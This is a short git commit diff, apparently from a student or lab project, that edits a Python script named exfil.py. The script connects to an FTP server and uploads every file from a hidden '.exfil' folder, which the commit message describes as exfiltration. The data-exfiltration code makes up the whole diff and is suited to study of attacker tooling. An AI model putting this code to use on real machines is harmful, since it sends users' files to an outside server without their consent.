19d2f77cdf2e4d4f11254d69a8a20bbbcb1e1fbd
Jack_PC <jfleming48@my.bcit.ca>
2025-05-27 14:07:27 -0700

    calls for ftp connection and exfiltrates files to ftp server

--- utils/exfil.py
+++ utils/exfil.py
@@ -1,15 +1,18 @@
-from ftp_connect import connect_ftp
+from .ftp_connect import connect_ftp
 import ftplib
 import os
 
 ftp = connect_ftp()
+ftp.set_debuglevel(2)
 
 exfil_dir = "C:/Users/jgwfl/OneDrive/Desktop/test_dir/.exfil"
 
- #scan dir for object
+print(ftp.sock)
+
+#  scan dir for object
 for obj in os.scandir(exfil_dir):
     with open(obj.path, "rb") as f:
         ftp.storbinary(f"STOR {obj.name}", f)
         print(f"Uploaded {obj.name}")
 
-ftp.quit
+# ftp.quit()
